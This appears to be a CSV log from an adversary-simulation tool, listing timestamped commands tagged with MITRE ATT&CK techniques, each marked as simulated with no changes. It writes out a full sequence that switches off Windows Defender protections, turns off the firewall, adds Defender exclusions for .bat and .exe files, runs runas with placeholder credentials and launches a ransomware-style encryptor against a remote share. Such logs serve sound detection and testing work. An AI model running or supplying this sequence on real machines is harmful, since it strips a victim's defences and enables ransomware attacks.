"Timestamp","Command","Technique","Mode","Status"
"2026-05-27 08:44:56","Set-MpPreference -EnableControlledFolderAccess Disabled","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -PUAProtection disable","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableRealtimeMonitoring $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableBehaviorMonitoring $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableBlockAtFirstSeen $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableIOAVProtection $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisablePrivacyMode $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableArchiveScanning $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableIntrusionPreventionSystem $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -DisableScriptScanning $true","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -SubmitSamplesConsent 2","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -MAPSReporting 0","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -HighThreatDefaultAction 6 -Force","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -ModerateThreatDefaultAction 6","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -LowThreatDefaultAction 6","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -SevereThreatDefaultAction 6","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Set-MpPreference -ScanScheduleDay 8","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","netsh advfirewall set allprofiles state off","T1562.004 - Impair Defenses: Disable or Modify System Firewall","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Add-MpPreference -ExclusionExtension.bat","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","Add-MpPreference -ExclusionExtension.exe","T1562.001 - Impair Defenses: Disable or Modify Tools","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","runas /netonly /user:<domain\user> CMD","T1078 - Valid Accounts (using runas)","Simulate","Simulated (no changes)"
"2026-05-27 08:44:56","<domain\user/password>","Unknown/Other","Simulate","Simulated (no changes)"
"2026-05-27 08:44:57","w.exe -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulate","Simulated (no changes)"
"2026-05-27 08:44:57","w.exe -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulate","Simulated (no changes)"
"2026-05-27 08:44:57","w.exe -p=\\<remote share> -n=1","T1486 - Data Encrypted for Impact","Simulate","Simulated (no changes)"
